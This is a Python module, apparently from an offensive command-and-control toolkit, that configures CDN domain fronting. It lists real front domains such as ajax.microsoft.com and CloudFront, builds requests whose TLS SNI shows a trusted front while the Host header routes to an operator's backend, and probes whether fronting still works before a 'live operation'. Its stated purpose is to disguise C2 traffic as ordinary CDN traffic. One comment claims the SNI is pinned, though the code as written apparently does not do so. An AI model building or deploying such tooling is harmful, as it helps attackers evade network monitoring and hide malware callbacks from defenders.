"""CDN domain fronting configuration and request builder.

Domain fronting hides the real C2 backend behind a high-reputation CDN edge
node. The TLS SNI is set to the CDN's front domain (what the firewall sees)
while the HTTP ``Host`` header points at the operator's backend that is also
served by that CDN. To a network monitor the connection looks like ordinary
traffic to Microsoft, Cloudflare, Fastly, or Amazon.

.. warning::

    Several major CDNs have **deprecated SNI/Host mismatch** — they now enforce
    that the TLS SNI and the HTTP ``Host`` header match, which breaks classic
    domain fronting. Enforcement is not uniform: some CDN products (e.g.
    Cloudflare Workers, Azure Front Door custom domains) still permit a
    controlled form of fronting when the operator controls a resource on the
    same CDN. **Always test a provider with :func:`test_fronting` against
    current enforcement before relying on it in a live operation.** What works
    today may be blocked tomorrow.
"""

from __future__ import annotations

import logging
import ssl
from urllib.parse import urlparse

import httpx

logger = logging.getLogger("dropoutjeep")

# CDN edge domains usable as fronting relays. ``front`` is the high-reputation
# domain the firewall sees (TLS SNI); the operator's backend must be served
# from the same CDN so that the ``Host`` header routes to it internally.
#
# NOTE: wildcard entries (``*.workers.dev``, ``*.cloudfront.net``) are template
# domains — replace the ``*`` with the operator's actual resource hostname when
# building a real request.
CDN_PROVIDERS: dict[str, dict[str, str]] = {
    "azure": {
        "front": "ajax.microsoft.com",
        "sni": "ajax.microsoft.com",
    },
    "cloudflare": {
        "front": "*.workers.dev",
        "sni": "*.workers.dev",
    },
    "fastly": {
        "front": "global.prod.fastly.net",
        "sni": "global.prod.fastly.net",
    },
    "amazon": {
        "front": "*.cloudfront.net",
        "sni": "*.cloudfront.net",
    },
}

# Default request path used when building a fronted request. The operator
# usually overrides this with their backend's actual route.
_DEFAULT_PATH = "/"


def list_providers() -> list[str]:
    """Return the list of configured CDN provider keys."""
    return sorted(CDN_PROVIDERS.keys())


def get_fronting_config(provider: str) -> dict[str, str]:
    """Return the front domain and SNI value for a CDN provider.

    Args:
        provider: CDN key (``"azure"``, ``"cloudflare"``, ``"fastly"``,
            ``"amazon"``).

    Returns:
        ``{"front": <front_domain>, "sni": <sni_value>}``.

    Raises:
        ValueError: if the provider is not in :data:`CDN_PROVIDERS`.
    """
    key = provider.lower().strip()
    if key not in CDN_PROVIDERS:
        raise ValueError(
            f"Unknown CDN provider '{provider}'. "
            f"Available: {', '.join(list_providers())}"
        )
    # Return a copy so callers cannot mutate the canonical config.
    return dict(CDN_PROVIDERS[key])


def build_fronted_request(host_header: str, provider: str) -> dict[str, str]:
    """Build a domain-fronted request descriptor.

    The returned dict contains the three values a transport layer needs to
    issue a fronted request:

    - ``sni``  — the TLS Server Name Indication to send (the CDN front).
    - ``host`` — the HTTP ``Host`` header (the operator's backend).
    - ``url``  — the full ``https://`` URL using the front domain as the
      network destination, so the connection resolves to the CDN edge.

    Args:
        host_header: The backend hostname the CDN should route to internally
            (the operator's resource on the same CDN). Must not be empty.
        provider: CDN provider key.

    Returns:
        ``{"sni": ..., "host": ..., "url": ...}``.

    Raises:
        ValueError: if ``host_header`` is empty or the provider is unknown.
    """
    host = (host_header or "").strip()
    if not host:
        raise ValueError("host_header must not be empty")
    config = get_fronting_config(provider)

    front_domain = config["front"]
    # Wildcard fronts (``*.workers.dev``) cannot be used literally as a
    # network destination. When the front is a wildcard, the operator's
    # host_header IS the frontable resource on that CDN, so we use it as both
    # the SNI and the network destination while keeping the Host header
    # pointing at the same resource. This is the supported Cloudflare Workers /
    # CloudFront pattern.
    if front_domain.startswith("*."):
        sni = host
        netloc = host
    else:
        sni = config["sni"]
        netloc = front_domain

    url = f"https://{netloc}{_DEFAULT_PATH}"
    logger.debug(
        "Built fronted request via %s: sni=%s host=%s url=%s",
        provider, sni, host, url,
    )
    return {
        "sni": sni,
        "host": host,
        "url": url,
    }


def test_fronting(
    provider: str,
    backend_host: str,
    *,
    timeout: float = 10.0,
    path: str = _DEFAULT_PATH,
) -> tuple[bool, str]:
    """Probe whether domain fronting works for a provider right now.

    Issues an HTTPS request to the CDN front domain with the ``Host`` header
    set to ``backend_host`` and checks whether the response plausibly came
    from the operator's backend (any 2xx/3xx) rather than a CDN error page.

    .. note::

        Some CDNs have **deprecated SNI/Host mismatch** and will return a 4xx
        (often 403/421) when the SNI and Host differ. A failure here means the
        provider currently enforces SNI/Host alignment and classic fronting is
        blocked — re-test periodically because enforcement changes.

    Args:
        provider: CDN provider key.
        backend_host: Operator's backend hostname served by the same CDN.
        timeout: Request timeout in seconds.
        path: URL path to request on the backend.

    Returns:
        ``(works, message)`` where ``works`` is True if the fronted request
        returned a 2xx/3xx status, and ``message`` is a human-readable status
        string (e.g. ``"ok: 200"`` or ``"blocked: 403"``).
    """
    try:
        config = get_fronting_config(provider)
    except ValueError as exc:
        return False, f"config error: {exc}"

    front_domain = config["front"]
    if front_domain.startswith("*."):
        # Wildcard fronts route via the operator's own resource name.
        netloc = backend_host
        sni = backend_host
    else:
        netloc = front_domain
        sni = config["sni"]

    url = f"https://{netloc}{path}"
    # We need a custom SSL context so the SNI is set to the front domain (or
    # the operator resource for wildcards) while the Host header differs.
    ctx = ssl.create_default_context()
    # Some CDNs present a certificate for the front domain; pin server_hostname
    # to the SNI value so verification uses the front cert, not the Host.
    client = httpx.Client(
        timeout=timeout,
        verify=ctx,
        # httpx uses the URL hostname for SNI by default. To force a custom
        # SNI we rely on the URL netloc being the front domain, which matches
        # the desired SNI. The Host header is overridden per-request below.
        follow_redirects=False,
    )
    try:
        resp = client.get(
            url,
            headers={"Host": backend_host},
            # Inform the transport of the intended SNI explicitly.
            extensions={"sni": sni} if sni else None,
        )
    except httpx.RequestError as exc:
        logger.warning("Fronting test for %s failed: %s", provider, exc)
        return False, f"request error: {exc}"
    finally:
        client.close()

    if 200 <= resp.status_code < 400:
        logger.info(
            "Fronting via %s works (status %d, host=%s)",
            provider, resp.status_code, backend_host,
        )
        return True, f"ok: {resp.status_code}"

    logger.warning(
        "Fronting via %s blocked (status %d, host=%s)",
        provider, resp.status_code, backend_host,
    )
    return False, f"blocked: {resp.status_code}"


def resolve_provider(url: str) -> str | None:
    """Best-effort guess of the CDN provider from a URL's hostname.

    Returns the provider key or ``None`` if the hostname does not match any
    known CDN front domain. Useful for logging/telemetry.
    """
    parsed = urlparse(url)
    host = (parsed.hostname or "").lower()
    if not host:
        return None
    for key, cfg in CDN_PROVIDERS.items():
        front = cfg["front"].lower()
        if front.startswith("*."):
            suffix = front[1:]  # ".workers.dev"
            if host.endswith(suffix) or host == front[2:]:
                return key
        elif host == front:
            return key
    return None
